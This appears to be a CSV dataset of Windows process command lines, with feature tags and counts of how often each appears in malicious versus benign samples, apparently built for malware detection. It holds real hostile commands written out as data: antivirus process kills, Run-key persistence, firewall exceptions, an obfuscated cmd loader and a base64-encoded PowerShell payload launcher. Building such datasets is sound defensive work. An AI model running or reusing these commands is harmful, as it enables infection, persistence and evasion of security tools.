tags,mal_cnt,ben_cnt,example
arg_taskkill; ext_exe; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,3798,1,taskkill /IM GDScan.exe /T /F
ext_doc; normal_entropy; normal_string_len,2097,1,"/n ""C:\Bill_AS3318D.doc"""
dir_%temp%; ext_vbs; normal_entropy; normal_string_len; parentprocess_cmd.exe,2066,1,%TEMP%\Retrive5129563556926688662.vbs
dir_%temp%; ext_exe; ext_vbs; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,2056,2,/C cscript.exe %TEMP%\Retrive5129563556926688662.vbs
normal_entropy; normal_string_len,1976,1,"""C:\9f0f848cc5f6daecccddf8ca0bed1f10.dll"",PlayGame"
arg_taskkill; ext_exe; low_entropy; normal_string_len; parentprocess_unknown_process.exe,1485,1,taskkill /IM FPWin.exe /T /F
arg_nslookup; ext_bit; ext_ru; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,766,2,nslookup ransomware.bit ns2.wowservers.ru
very_low_entropy; very_low_string_len,533,1,/dde
normal_entropy; normal_string_len; parentprocess_iexplore.exe,531,1,SCODEF:2744 CREDAT:79873
arg_attrib; dir_%userprofile%; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,509,2,"attrib +h ""%USERPROFILE%\reDpVjHMkmK"""
high_string_len; normal_entropy,463,333,"""C:\steam_api.dll"",SteamAPI_ISteamGameServer_GetServerReputation"
arg_taskkill; ext_exe; normal_entropy; normal_string_len; parentprocess_cmd.exe,410,10,taskkill  /im 1083931927.exe /f
ext_doc; low_entropy; low_string_len,410,2,"/n ""C:\168.doc"""
arg_tasklist; ext_exe; normal_entropy; normal_string_len; parentprocess_cmd.exe,332,1,"tasklist  /nh /fi ""imagename eq svhost.exe"""
arg_add; arg_allowedprogram; arg_enable; arg_firewall; arg_netsh; dir_%temp%; ext_exe; high_string_len; normal_entropy; parentprocess_unknown_process.exe,318,1,"netsh firewall add allowedprogram ""%TEMP%\server3.exe"" ""server3.exe"" ENABLE"
arg_stop; dir_%windir%; normal_entropy; normal_string_len; parentprocess_net.exe,295,5,%WINDIR%\system32\net1  stop wuauserv
ext_doc; high_string_len; normal_entropy,288,185,"/n ""C:\1438f590ffcca094def32d733903b45b201c2ab97618909352b87f9d29c39724.doc"""
arg_find; ext_exe; low_entropy; low_string_len; parentprocess_cmd.exe,287,2,"find  /i ""svhost.exe"""
arg_xcopy; dir_%appdata%; dir_%programfiles%; ext_0_25; high_string_len; normal_entropy; parentprocess_unknown_process.exe,272,1,"xcopy ""%PROGRAMFILES%\Java\jre1.8.0_25"" ""%APPDATA%\Oracle\"" /e"
arg_add; arg_reg; dir_%appdata%; dir_%systemroot%; dir_%userprofile%; dir_%windir%; high_entropy; parentprocess_unknown_process.exe; very_high_string_len,246,0,"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v rocjOSwoAnV /t REG_EXPAND_SZ /d ""\""%APPDATA%\Oracle\bin\javaw.exe\"" -jar \""%USERPROFILE%\BLBDTEGGUGG\hADRGksvuAw.Osfskm\"""" /f"
arg_taskkill; ext_exe; low_entropy; normal_string_len; parentprocess_cmd.exe,238,7,taskkill  /f /im weixiao.exe
ext_doc; low_string_len; normal_entropy,204,63,"/n ""C:\sample1.doc"""
low_entropy; normal_string_len; parentprocess_cmd.exe,201,7,/c  ^FT^y^Pe | FINdst^R mdf^i
arg_-s; arg_-x; parentprocess_unknown_process.exe; very_low_entropy; very_low_string_len,200,1,-x -s 368
high_entropy; high_string_len,189,158,"""C:\PICUS_7d829abe26b30ced467513e95f3448bc9f30de2fdced81c20b0d7699bd69c644.dll"",_ReflectiveLoader@4"
arg_cmd; low_entropy; parentprocess_unknown_process.exe; very_high_string_len,187,0,"Cmd /V:ON/C""set *  =tvZFwRdsmkmaHLPzZpQQiwpqVMghuSlNf,crDj{yO=4WeTxB9$}JX\I.b/)Eon'+5:-;3@8 C(&&for %N in (22,60,21,44,35,7,27,44,30,30,71,49,60,22,1,41,61,44,21,66,60,56,37,44,34,0,71,31,44,0,55,43,44,56,72,30,20,44,61,0,67,49,47,51,24,41,62,27,0,0,22,65,57,57,10,44,30,20,7,7,11,9,20,7,7,55,34,60,10,57,54,11,46,59,69,27,0,0,22,65,57,57,32,35,11,0,20,7,55,35,28,57,30,9,39,54,68,54,46,69,27,0,0,22,65,57,57,0,27,11,30,20,39,60,30,11,55,34,60,55,20,61,57,21,22,66,34,60,61,0,44,61,0,57,22,30,28,26,20,61,7,57,0,11,23,39,44,44,10,66,22,35,44,6,44,32,20,61,44,6,57,44,52,51,45,44,7,36,15,69,27,0,0,22,65,57,57,32,35,20,60,7,60,30,11,35,55,34,30,57,48,10,70,9,61,13,0,19,69,27,0,0,22,65,57,57,30,44,20,7,28,35,44,34,60,20,61,10,11,34,27,20,61,44,55,34,60,10,57,7,6,25,39,36,25,64,6,62,55,29,22,30,20,0,73,62,69,62,58,67,49,3,31,40,71,41,71,62,70,70,42,62,67,49,13,37,5,41,49,44,61,1,65,0,44,10,22,63,62,53,62,63,49,3,31,40,63,62,55,44,46,44,62,67,32,60,35,44,11,34,27,73,49,31,10,47,71,20,61,71,49,47,51,24,58,38,0,35,39,38,49,60,22,1,55,36,60,21,61,30,60,11,6,3,20,30,44,73,49,31,10,47,33,71,49,13,37,5,58,67,29,0,11,35,0,66,14,35,60,34,44,7,7,71,49,13,37,5,67,56,35,44,11,9,67,50,34,11,0,34,27,38,50,50,71,71,71,71,71,71,71,71,71,71,71,71,71,71,71,71,71,76)do set ~  =!~  !!*  :~%N,1!&&if %N equ 76 call %~  :*~  !=%"""
arg_1; dir_%windir%; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,173,2,"""%WINDIR%\system32\WININET.dll"",DispatchAPICall 1"
arg_query; arg_reg; high_string_len; normal_entropy; parentprocess_cmd.exe,169,333,"REG  QUERY ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\14.0\Word\File MRU"" /v ""Item 1"""
ext_vbs; low_entropy; low_string_len; parentprocess_cmd.exe,168,2,"""C:\haxed.vbs"""
arg_300; arg_timeout; low_entropy; low_string_len; parentprocess_cmd.exe,163,2,timeout  /t 300
arg_delete; arg_reg; high_string_len; normal_entropy; parentprocess_cmd.exe,162,333,reg  delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\12.0\Word\Resiliency /f
low_string_len; parentprocess_cmd.exe; very_low_entropy,160,1,"/S /D /c"" echo f"""
arg_-e; arg_powershell; normal_entropy; parentprocess_cmd.exe; very_high_string_len,154,1,powershell   -e IABpAE4AdgBPAEsAZQAtAGUAeABQAFIAZQBTAFMAaQBPAG4AKAAgAG4ARQBXAC0AbwBiAGoARQBjAHQAIAAgAFMAWQBzAFQAZQBNAC4ASQBPAC4AQwBvAG0AUABSAGUAUwBTAEkAbwBOAC4ARABFAEYATABBAHQARQBTAFQAUgBFAEEAbQAoAFsASQBvAC4AbQBFAG0ATwByAFkAUwB0AHIAZQBBAG0AXQAgAFsAQwBPAG4AdgBlAFIAVABdADoAOgBmAHIATwBNAGIAQQBTAEUANgA0AHMAVAByAEkATgBnACgAJwBUAFYATABmAGEAOQBzAHcARQBIADQAZgA3AEgAOABRAHcAVgBRAFMAYgBxAFUAbABmAGQAaQBvAEcAWABSAEwATgBoAHAAYQBrAGcAZQAzAHQAQgBsADcAcwBDAHgAZgBZAHkAMgBPAGIAVwBRAGwAYQB3AG4ANQAzADMAZQBuAHAAagBEAEQAbgBYADUAOQBkADkAOQAzAGQAMAA3AGEAdwBWAFIAbQBxAE4AaABYAGQAaQBaADQAeQAxAE0ATwBQAEIAWAA4AEwAMgA0AHUAdQB2AEkAUABXAEMANQBUAEgAcgBoAGsAMwByAFIAVgB0ADgAMgBTADEAZQBvAEIAcwBRAHEAeABDAEMAUwBjAGkARQBBAEsAdABEAHgAQwBKAGMAdABmAGgAdwBCAGIAdABZAEMAZwBIAHEARwBjAE4AZwA3AGEAawBDAFcATAAvAEQAdABHAEoAaQBkAEMAMQBjAEoATABFAE8ATgBQACsASgAyAHoAeQBaAGYASgArAFAASgBTAFoAcwBtADMAMgBmAFEASgBRAFkASgAvAC8ARgBCAFQAdABvAEMAdQB2ADkASwA2ADcAdwBZAFgAMwBCADUASwBQAE8AOABHAGgALwA0AGsAbABRADgAbgBjADEAdAAwAEIAbQAxAE4ARAAzAFMAagBiAEkAZQBlAHIAdgBXAHYAdgBRADEAbQBxAGEALwByAEUAQwBpAGIAYwBaADQASwA5AEcAQQAzAEMASQBxAEkAaABrAEwAYgA5AGMANgBzAEsAYQBsACsAUQBuAGMAYgA2AGgALwBMAHMAYwBiAGQAOQBYADkAYQA2AEYAVwBUAEQARQA5ADgAWgBRAGwATgBWAE8ATQBHAGgAVQB0AEYAMwBQAHIAdQA3AHYAUABEADcAVQAwAE0AUgBJAHUAYwBNAFkAcQBTAFUAQwBiAG8AaQBjAHgAdgB3AEEALwBLAFYAYwByAHMAOQBKAFQATwB6AFgAeQBDAHkALwBpAEcAcwBPADkASwBZAFUAOAAxAHEARgBpAFQAWABwAEcAQwBHAFcARQAxAGwAeQByAHYARwB4AGMARQBVAG0ARABiADgAdABtAFUAVwBnAHYAdAAvAHEAcgBmAGwAWQAyAHoATABHAFgAOABOADAAYwBmAHUANQA0AHkASQBiAGkAaQB3AGwANQBvAG4ASQBBAGgAegA1ADAASABZADIAdQBSAG0ATwBIAFoATQB0AGUAeQAyAEgAcAA1AEMAUAA3ADEAUQBEAE4AVwBvADEAbABYAFAATABaAE4AcwBUAFQAVgB6ADMAbgBSAHcATwBnAE4AcQBrAGIAMwBYAFIANQA4ADQAWQByAEYAZQBpAFQAawBPAFMATgB1AG0AWgAwAGgAdwBaAHoANgBnAEgAcQBSAFkAVQBPAC8AQgBWAHoAZwB4AFQAeABBAEgASQBLAFUANABnADEAWgBJAHUAOABtAE8AMQBvAFQAYgBIADAANABIAHYAOABCACcAIAApACAALAAgAFsAUwBZAHMAdABFAE0ALgBpAG8ALgBDAG8AbQBwAHIARQBzAFMAaQBPAE4ALgBjAG8ATQBwAHIARQBTAFMASQBPAE4AbQBvAGQARQBdADoAOgBEAGUAQwBPAE0AcAByAGUAUwBTACAAKQB8ACAAZgBPAFIAZQBBAEMAaAAtAG8AQgBKAGUAQwBUACAAewAgAG4ARQBXAC0AbwBiAGoARQBjAHQAIAAgAEkATwAuAFMAVAByAEUAYQBtAFIAZQBhAEQARQByACgAIAAkAF8AIAAsAFsAcwBZAHMAVABFAE0ALgB0AEUAeAB0AC4AZQBuAGMAbwBkAEkATgBnAF0AOgA6AGEAUwBjAEkAaQAgACkAfQAgAHwAIABGAG8AUgBlAGEAYwBoAC0AbwBiAEoAZQBDAFQAIAB7ACQAXwAuAHIAZQBhAEQAdABvAEUATgBkACgAIAApAH0AKQAgAA==
arg_-nohome; very_low_entropy; very_low_string_len,146,1,-nohome
arg_-nohome; parentprocess_unknown_process.exe; very_low_entropy; very_low_string_len,144,1,-nohome
arg_csv; arg_tasklist; low_entropy; low_string_len; parentprocess_cmd.exe,144,2,tasklist  /fo csv
arg_query; arg_reg; high_string_len; normal_entropy; parentprocess_cmd.exe,144,333,"/c REG QUERY ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\12.0\Word\File MRU"" /v ""Item 1"""
